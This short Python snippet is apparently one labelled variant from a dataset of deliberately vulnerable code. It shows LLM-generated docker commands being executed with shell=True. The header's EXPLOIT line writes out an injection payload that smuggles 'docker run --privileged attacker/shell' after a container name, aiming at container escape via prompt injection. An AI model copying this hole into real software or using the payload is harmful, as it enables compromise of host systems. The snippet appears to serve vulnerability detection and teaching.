# MITRE: AML.T0051.001
# OWASP: LLM01
# CWE: CWE-77
# SEVERITY: Critical
# DESCRIPTION: LLM output used in Docker exec command enabling container escape, variant 60
# EXPLOIT: Inject to produce: 'container_name; docker run --privileged attacker/shell'

import subprocess, openai
def ai_container_manager_60(task: str) -> str:
    prompt = f"Generate docker exec command for: {{task}}. Return only the command."
    resp = openai.ChatCompletion.create(model="gpt-4",
        messages=[{{"role":"user","content":prompt}}])
    cmd = resp.choices[0].message.content.strip()
    # VULNERABLE: executing LLM-generated docker command
    return subprocess.check_output(cmd, shell=True, text=True)
